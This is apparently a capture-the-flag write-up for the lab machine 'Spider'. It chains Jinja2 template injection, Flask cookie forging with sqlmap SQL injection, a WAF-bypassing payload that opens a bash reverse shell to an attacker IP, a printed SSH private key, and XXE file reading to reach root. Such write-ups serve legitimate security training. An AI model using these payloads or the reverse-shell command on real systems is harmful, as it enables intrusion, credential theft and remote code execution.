![SPIDER](images/banner.png)

## Enumeration

```
└─$ sudo nmap -sS -sV -sU 10.129.144.65                                                                                                                                       1 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 09:35 EDT
Nmap scan report for spider.htb (10.129.144.65)
Host is up (0.031s latency).
Not shown: 1997 closed ports
PORT   STATE         SERVICE VERSION
22/tcp open          ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open          http    nginx 1.14.0 (Ubuntu)
68/udp open|filtered dhcpc
```

## Initial Foothold

http://spider.htb/register allows SSTI on registering new Users.
To test this we create a new User with the following creds:

```
Username: {{7*7}}
Confirm Username: {{7*7}}
Password: a
Confirm password: a
```

After logging in with the UUID and password: a we can visit the User Information from the left panel or by opening http://spider.htb/user in our browser:

![SSTI](images/SSTI_49.png)

We can see the username translated to 49, so we confirmed SSTI is possible.

However exploiting this is not as straight forward as it seemed. When we try to create more sofisticated usernames like `"{{'/etc/passwd'|file_excerpt(1,30)}}"@` we quickly realize we have a maximum of 10 characters as a username.

![10_chars_max](images/10_chars_max.png)

Testing only `{7*7}` as a username to get at least two more chars for our payload doesn't work either so with `{{}}` we only have six chars left for our payload.

However the username `{{config}}` reveals the SECRET_KEY: `Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942`
```
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None,
'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31),
'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'RATELIMIT_ENABLED': True, 'RATELIMIT_DEFAULTS_PER_METHOD': False, 'RATELIMIT_SWALLOW_ERRORS': False, 'RATELIMIT_HEADERS_ENABLED': False, 'RATELIMIT_STORAGE_URL': 'memory://', 'RATELIMIT_STRATEGY': 'fixed-window', 'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset', 'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit', 'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After', 'UPLOAD_FOLDER': 'static/uploads'}>

```

With the SECRET_KEY we can forge new Cookies, however this doesn't help us a lot since we don't know the uuid of a privileged user. But sqlmap finds the uuid to be vulnerable. However we need to do quite a complex query for that:

```
sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --delay 1 --dump
```

The `--eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')"` creates or cookie, using the flask_unsign library in python so make sure to `pip install flask_unsign` before running the sqlmap query. It will then try to inject into the session parameter and forge a cookie with the secret key.

Sqlmap will ask you a a couple of things when running the query. It is important to answer them correctly. You want sqlmap to process the custom injection marker, you don't want it to merge the cookies and you don't want it to url encode your cookie.
Later you don't want it to skip tests for other DBMses but you want it to include all tests for "MySQL" extending provided level and risk values.
After it found that your cookie is vulnerable you don't want it to test any other parameters.

We then receive next to a lot of other information the table `users` in the database `shop`:
```
+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |
| 2  | e4033c89-8c69-4863-82be-a986ba32a4ac | {{config}} | a               |
| 3  | 2c00e9a7-23a7-42e7-b5b6-f5e6e5a4327d | a          | a               |
| 4  | d324919a-57be-4c57-b932-744cd8ffc605 | chiv       | a               |
| 5  | 1cf95093-0ebe-4a9a-8fd8-9652ba81289a | Mitnick    | a               |
| 6  | d0afaf3c-89bb-4c3c-9056-4a0b7fd6b344 | a          | a               |
| 7  | 7e3e0cc3-96eb-487e-a862-e76720595264 | a          | a               |
| 8  | 9bb5e5ed-f225-439a-9b28-6f7b4a00d319 | chiv       | a               |
| 9  | b4043884-caec-4d83-a310-b0c62a148f1a | a          | a               |
| 10 | ff13f328-7336-495d-a060-24e243017cc0 | a          | a               |
| 11 | b1c1c658-2d9c-4253-9d5f-247d528d93a7 | a          | a               |
+----+--------------------------------------+------------+-----------------+
```
Which includes the users we added as well as one other user "chiv" with the password "ch1VW4sHERE7331" which we can use to login on http://spider.htb/login with the uuid "129f60ea-30cf-4065-afb9-6be45ad38b73" and the password "ch1VW4sHERE7331".

## User

In order to get a user shell let's have a look at what we have.

We can send support tickets from: http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal which was referenced at the admin panel after logging in as chiv.
We can then see those tickets at: http://spider.htb/view?check=support

This screams SSTI again. Unfortunately our tickets are being parsed by a WAF blocker:

![WAF_block](images/WAF_block.png)

which blocks the following chars: `' _ {{ }} . if` so we need to bypass that.

Have a long read on https://gusralph.info/jinja2-ssti-research/ on how to avoid WAF detection to come up with:

```
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS8xMzM3IDA+JjE= | base64 -d | bash")["read"]() %} a {% endwith %}
```

Where the base64 encrypted string is our reverse shell payload:

```
bash -i >& /dev/tcp/10.10.14.31/1337 0>&1
```

We are now logged in as chiv@spider and can claim the user.txt

## Root

For easier access we can use the id_rsa file under /home/chiv/.ssh/ to connect via ssh to the machine:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV
gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS
U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9
MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7
BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2
VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu
6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs
hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl
Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc
XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq
54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy
f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62
nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL
j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO
JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW
K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv
hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ
mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8
gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb
0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2
nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W
CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG
rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO
TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
-----END RSA PRIVATE KEY-----

```


```
ssh -i id_rsa chiv@10.129.103.247
```

Linpeas shows us that there is something running on port 8080

```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                              
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                       
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```

Lets use ssh to forward that port to our localhost and access it locally:

```bash
ssh -i id_rsa chiv@10.129.144.163 -L 8080:127.0.0.1:8080

```

We can now reach the site at http://127.0.0.1:8080

Inspecting the site we can find another input field which is hidden with the name "version". We can change its type from `hidden` to `text` for easier access or change its `value` directly.
So we have two parameters that we control, sweet. Let's check what that actually does by filling it with random input for example username=`username` and version=`ZGVjb2RlICdseG1sOiAn`. Afterwards decode the cookie like so:
```bash
flask-unsign --decode --cookie '.eJxVjkFPgzAAhf-K6dlDQVkiiRe0hbG0s4VSyq2MJQUKw4xklWX_Xbw4PX5573t5V2DdYEF4BQ81CIFAFDfI5axPCy7nsRg8eZTkq06qVovUiA7rQ2E_M0tbLh2SvdnXON3wcRJkcG9qsNHqC4pmlqHJVx3lO0gnJpuUQfQs-yYm2P7kK-MxEzSqoH1nueklCs7Kh56O07LI5v-cG0K8aiOt2TWFLYl0rPJf7v66zxNzUQsKNJ4SUkat7viTQCQ4xMTtpdF8wRc1nGD222_8P38YW2ygum1AcDR-5PAV3B7BdGrH-QxCePsGUfth5A.YLbl9w.5ipIIBG5UFoqiOXz9kOWvLXzyuk'
```
output:
```
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiBaR1ZqYjJSbElDZHNlRzFzT2lBbiAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+dXNlcm5hbWU8L3VzZXJuYW1lPgogICAgICAgIDxpc19hZG1pbj4wPC9pc19hZG1pbj4KICAgIDwvZGF0YT4KPC9yb290Pg==', 'points': 0}
```
base64 decode that:
```
<!-- API Version ZGVjb2RlICdseG1sOiAn -->
<root>
    <data>
        <username>username</username>
        <is_admin>0</is_admin>
    </data>
</root>
```
Great we find our username in the username field as expected and our random version string in the API Version comment at the top. We can exploit this by escaping the comment and declaring a new ENTITIY, which is a variable in xml basically, and call that ENTITIY(variable) as our username.

So let's put this as our version value: `1.0.0 --> <!DOCTYPE lxml [<!ENTITY example 'John'> ]> <!--` and call it by setting our username to `&example;`:

![John](images/john.png)

Nice! we got execution as we can see we are greeted as the username John even though we said `&example;` is our name so it got replaced by out entitiy.
 
Now we can cheese the root flag like this:

```xml
1.0.0 --> <!DOCTYPE lxml [<!ENTITY example SYSTEM 'file:///root/root.txt'> ]> <!--
```

For real root access we could just take the private key from /root/.ssh/ and authenticate with that for example.
